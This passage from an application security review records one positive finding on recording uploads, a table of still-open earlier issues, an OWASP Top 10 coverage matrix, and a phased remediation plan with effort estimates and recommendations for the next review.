### [SR-2026-04-11-038] Recording Upload Has Comprehensive Security Pipeline
- **Category:** File Upload Security
- **Description:** RecordingUploadService implements 6-layer validation: size, MIME, extension, binary signature, script injection detection, filename sanitization. Strong implementation.
- **Status:** Positive Finding (from previous review SR-44)

---

## Previously Identified Issues — Status Update

| Prior ID | Title | Previous Severity | Current Status |
|----------|-------|-------------------|----------------|
| SR-1 (Apr 10) | Token stored in localStorage | High | Still Open |
| SR-2 (Apr 10) | No account lockout | Medium | Still Open |
| SR-3 (Apr 10) | User enumeration | Medium | Still Open |
| SR-4 (Apr 10) | OrganizationScope bypass | High | Still Open |
| SR-5 (Apr 10) | Platform manager token revocation | Medium | Still Open |
| SR-6 (Apr 10) | SSRF in webhook URLs | High | Still Open |
| SR-7 (Apr 10) | CXML conference identifier | Medium | Still Open |
| SR-9 (Apr 10) | Missing rate limiting on voice | High | Still Open |
| SR-10 (Apr 10) | Session-update skips idempotency | Medium | Still Open |
| SR-11 (Apr 10) | Health endpoint info disclosure | Medium | Still Open |
| SR-13 (Apr 10) | SIP passwords plaintext | Medium | Still Open (Accepted Risk) |
| SR-14 (Apr 10) | PII in logs | Medium | Still Open |
| SR-16 (Apr 10) | HMAC separator ambiguity | Low | Still Open |
| SR-17 (Apr 10) | CDR old timestamps | Low | Still Open |
| SR-18 (Apr 10) | Default MinIO credentials | Medium | Still Open |
| SR-19 (Apr 10) | Default dialer token | Medium | Still Open |
| SR-20 (Apr 10) | Empty Redis password | Medium | Still Open |
| SR-21 (Apr 10) | ngrok in main compose | Low | Still Open |
| SR-22 (Apr 10) | Missing HSTS in Nginx | Medium | Still Open |
| SR-23 (Apr 10) | Nginx server_tokens | Low | Still Open |
| SR-24 (Apr 10) | Missing client_max_body_size | Low | Still Open |
| SR-25 (Apr 10) | Axios SSRF | Critical | Still Open |
| SR-26 (Apr 10) | React Router XSS | Critical | Still Open |
| SR-28 (Apr 10) | AWS SDK injection | High | Still Open |
| SR-29 (Apr 10) | PHPUnit deserialization | High | Still Open |
| SR-30 (Apr 10) | Sodium compat crypto | High | Still Open |
| SR-31 (Apr 10) | CommonMark bypass | Medium | Still Open |
| SR-32 (Apr 10) | Symfony process | Low | Still Open |
| SR-33 (Apr 10) | PsySH privilege escalation | Low | Still Open |
| SR-35 (Apr 10) | CAC race condition | High | Still Open |
| SR-36 (Apr 10) | Campaign lifecycle locks | Medium | Still Open |
| SR-37 (Apr 10) | WebSocket phone numbers | Low | Still Open |

**Note:** All previously identified issues remain open. No regressions detected.

---

## OWASP Top 10 Coverage Matrix

| OWASP Category | Status | Findings |
|----------------|--------|----------|
| A01: Broken Access Control | ⚠️ Partial | SR-004, SR-012, SR-013 |
| A02: Cryptographic Failures | ⚠️ Partial | SR-025, SR-027, SR-028 |
| A03: Injection | ✅ Good | SR-014 (minor) |
| A04: Insecure Design | ⚠️ Partial | SR-007, SR-010, SR-022 |
| A05: Security Misconfiguration | ⚠️ Needs Work | SR-016, SR-017, SR-018, SR-019, SR-020, SR-029, SR-030, SR-031 |
| A06: Vulnerable Components | ❌ Critical | SR-001, SR-002, SR-005, SR-006, SR-009, SR-021, SR-033, SR-034 |
| A07: Auth Failures | ⚠️ Partial | SR-004, SR-011 |
| A08: Data Integrity Failures | ⚠️ Partial | SR-015, SR-024 |
| A09: Logging & Monitoring | ✅ Good | SR-026 (minor) |
| A10: SSRF | ❌ High Risk | SR-003, SR-001 |

---

## Remediation Workplan

### Phase 1: Critical — Before Next Deployment (1-2 days)
| ID | Task | Effort | Priority |
|----|------|--------|----------|
| SR-001 | Update axios (SSRF vulnerability) | S | P0 |
| SR-002 | Update react-router-dom (XSS vulnerability) | S | P0 |
| SR-005 | Update aws/aws-sdk-php (injection) | S | P0 |
| SR-006 | Update phpunit/phpunit (deserialization) | S | P0 |
| SR-021 | Update paragonie/sodium_compat (crypto) | S | P0 |
| SR-007 | Add rate limiting to voice webhook endpoints | S | P0 |
| SR-009 | Update flatted (DoS) | S | P0 |

### Phase 2: High — Within 1 Sprint (1-2 weeks)
| ID | Task | Effort | Priority |
|----|------|--------|----------|
| SR-004 | Evaluate localStorage→httpOnly cookie migration | L | P1 |
| SR-008 | Audit all OrganizationScope bypass usages for org_id filtering | M | P1 |
| SR-003 | Implement SSRF protection for webhook URLs | M | P1 |
| SR-010 | Fix Go CAC counter race condition | M | P1 |
| SR-017 | Remove default MinIO credentials from docker-compose | S | P1 |
| SR-018 | Remove default dialer worker token | S | P1 |

### Phase 3: Medium — Within 1 Month
| ID | Task | Effort | Priority |
|----|------|--------|----------|
| SR-011 | Implement account lockout mechanism | M | P2 |
| SR-012 | Fix user enumeration in registration validation | S | P2 |
| SR-013 | Add token revocation on platform manager role change | S | P2 |
| SR-014 | Add conference identifier validation in CxmlBuilder | S | P2 |
| SR-015 | Add lightweight idempotency for session updates | M | P2 |
| SR-016 | Restrict webhook health endpoint information | S | P2 |
| SR-019 | Enforce Redis password in all environments | S | P2 |
| SR-020 | Add HSTS to Nginx config | S | P2 |
| SR-022 | Add distributed locks for campaign lifecycle | S | P2 |
| SR-023 | Update league/commonmark | S | P2 |
| SR-024 | Add max age for CDR timestamps | S | P2 |

### Phase 4: Low/Informational — Backlog
| ID | Task | Effort | Priority |
|----|------|--------|----------|
| SR-025-028 | Data storage and crypto minor items | S each | P3 |
| SR-029-031 | Infrastructure hardening | S each | P3 |
| SR-033-034 | Remaining dependency updates | S each | P3 |
| SR-032 | WebSocket data filtering | M | P3 |

---

## Estimated Total Effort

| Phase | Items | Effort |
|-------|-------|--------|
| Phase 1 (Critical) | 7 | 1-2 days |
| Phase 2 (High) | 6 | 1-2 weeks |
| Phase 3 (Medium) | 11 | 2-3 weeks |
| Phase 4 (Low) | 8 | Ongoing |

---

## Recommendations for Next Review

1. **Dependency monitoring:** Set up automated `composer audit` and `npm audit` in CI/CD pipeline
2. **SSRF deep dive:** After implementing webhook URL validation, conduct targeted SSRF testing
3. **Token migration:** If httpOnly cookie migration is implemented, conduct dedicated session security review
4. **Penetration testing:** Consider external penetration test focusing on webhook endpoints and multi-tenant isolation
5. **Go worker security:** Dedicated review of the dialer worker's Redis interactions and error handling
6. **Fix verification:** Verify all Phase 1 critical fixes before next review

---

*Generated from SECURITY-REVIEW-WORKPLAN.md v1.0*
*Review Date: 2026-04-11*
